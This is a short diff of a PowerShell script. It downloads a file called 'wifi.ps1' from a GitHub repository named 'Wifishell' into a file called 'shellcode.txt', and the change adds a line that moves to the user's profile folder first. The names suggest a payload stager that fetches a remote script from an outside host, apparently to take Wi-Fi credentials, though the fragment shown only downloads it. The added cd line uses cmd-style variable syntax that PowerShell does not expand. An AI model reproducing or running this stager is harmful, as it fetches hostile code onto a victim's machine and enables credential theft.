@@ -1,4 +1,5 @@
 $source = "https://raw.githubusercontent.com/Danij123/Wifishell/master/wifi.ps1"
+cd %USERPROFILE%
 $destination = "shellcode.txt"
 $web = New-Object System.Net.WebClient
 $web.DownloadFile($source, $destination)
